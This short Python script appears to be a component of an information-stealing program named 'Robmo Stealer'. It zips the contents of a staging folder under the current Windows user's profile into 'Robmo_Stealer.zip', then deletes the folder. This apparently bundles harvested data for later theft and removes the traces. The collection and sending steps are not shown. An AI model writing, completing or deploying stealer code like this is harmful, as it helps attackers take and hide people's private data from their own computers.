import zipfile
import os
import shutil

def create_zip_folder(username):
    user_folder = os.path.join("C:\\Users", username, "𝐔𝐬𝐞𝐫")
    zip_file_path = os.path.join("C:\\Users", username, "𝐑𝐨𝐛𝐦𝐨_𝐒𝐭𝐞𝐚𝐥𝐞𝐫.zip")

    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(user_folder):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, user_folder)
                zipf.write(file_path, arcname=arcname)

        shutil.rmtree(user_folder)

if __name__ == '__main__':
    username = os.getlogin()
    create_zip_folder(username)
